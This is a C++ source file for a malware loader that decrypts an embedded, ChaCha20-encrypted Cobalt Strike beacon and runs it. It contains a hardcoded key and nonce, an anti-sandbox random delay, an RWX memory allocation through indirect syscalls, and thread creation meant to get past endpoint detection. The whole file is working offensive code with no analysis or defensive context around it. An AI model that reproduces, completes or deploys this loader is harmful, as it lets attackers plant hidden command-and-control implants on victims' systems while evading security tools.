// Beacon Loader with Indirect Syscalls
// Uses ntdll function pointers for syscall execution

#include <Windows.h>
#include <vector>
#include <cstdio>

#include "syscalls.h"

#define CHACHA20_IMPLEMENTATION
#include "..\libs\chacha\chacha20.h"

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

// ChaCha20 decryption keys (must match encryptor.cpp)
static const uint8_t g_decryptionKey[32] = {
    0x1B, 0x27, 0x55, 0x64, 0x73, 0x8B, 0x9F, 0x4D,
    0x58, 0x4A, 0x7D, 0x67, 0x8C, 0x79, 0x77, 0x46,
    0xBE, 0x6B, 0x4E, 0x0C, 0x54, 0x57, 0xCD, 0x95,
    0x18, 0xDE, 0x7E, 0x21, 0x47, 0x66, 0x7C, 0x94
};

static const uint8_t g_decryptionNonce[12] = {
    0x4A, 0x51, 0x78, 0x62, 0x8D, 0x2D, 0x4A, 0x54,
    0x88, 0xE5, 0x3C, 0x50
};

bool ExecutePayload()
{
#ifdef _DEBUG
    printf("[*] Starting payload execution...\n");
#endif
    
    // Anti-sandbox: random delay
    Sleep(1000 + (GetTickCount() % 1000));
    
    // Load beacon from embedded resource
    HMODULE hModule = GetModuleHandleW(NULL);
    const wchar_t* resName = L"BEACON_PAYLOAD";
    
    HRSRC hResInfo = FindResourceW(hModule, resName, MAKEINTRESOURCEW(10));
    if (!hResInfo) {
#ifdef _DEBUG
        printf("[-] FindResourceW failed: %lu\n", GetLastError());
#endif
        return false;
    }

    HGLOBAL hResData = LoadResource(hModule, hResInfo);
    LPVOID pData = LockResource(hResData);
    DWORD dwSize = SizeofResource(hModule, hResInfo);
    
    if (!pData || dwSize == 0) {
#ifdef _DEBUG
        printf("[-] Failed to load resource\n");
#endif
        return false;
    }

#ifdef _DEBUG
    printf("[+] Resource loaded: %lu bytes\n", dwSize);
#endif

    // Decrypt beacon with ChaCha20
    std::vector<uint8_t> decrypted((uint8_t*)pData, (uint8_t*)pData + dwSize);
    chacha20_xor(g_decryptionKey, g_decryptionNonce, decrypted.data(), decrypted.size(), 0);
    
#ifdef _DEBUG
    printf("[+] Decrypted beacon, first bytes: %02X %02X %02X %02X\n", 
           decrypted[0], decrypted[1], decrypted[2], decrypted[3]);
#endif
    
    // Allocate RWX memory using indirect syscall
    // Cobalt Strike beacon requires RWX for self-modification
    PVOID addr = NULL;
    SIZE_T size = decrypted.size();
    
    NTSTATUS status = NtAllocateVirtualMemory(
        GetCurrentProcess(),
        &addr,
        0,
        &size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    
    if (!NT_SUCCESS(status) || !addr) {
#ifdef _DEBUG
        printf("[-] NtAllocateVirtualMemory failed: 0x%lX\n", status);
#endif
        return false;
    }
    
#ifdef _DEBUG
    printf("[+] Memory allocated at: %p (RWX)\n", addr);
#endif

    // Copy beacon to allocated memory
    memcpy(addr, decrypted.data(), decrypted.size());
    
    // Clear decrypted buffer from memory
    SecureZeroMemory(decrypted.data(), decrypted.size());
    
#ifdef _DEBUG
    printf("[*] Executing beacon...\n");
#endif
    
    // Execute beacon in new thread using indirect syscall
    HANDLE hThread = NULL;
    status = NtCreateThreadEx(
        &hThread,
        THREAD_ALL_ACCESS,
        NULL,
        GetCurrentProcess(),
        addr,
        NULL,
        FALSE,
        0,
        0,
        0,
        NULL
    );
    
    if (!NT_SUCCESS(status) || !hThread) {
#ifdef _DEBUG
        printf("[-] NtCreateThreadEx failed: 0x%lX\n", status);
#endif
        return false;
    }
    
#ifdef _DEBUG
    printf("[+] Beacon thread created: %p\n", hThread);
#endif
    
    // Wait for beacon to initialize
    WaitForSingleObject(hThread, INFINITE);
    
    // Cleanup
    NtClose(hThread);
    
    return true;
}

int main()
{
    ExecutePayload();
    return 0;
}

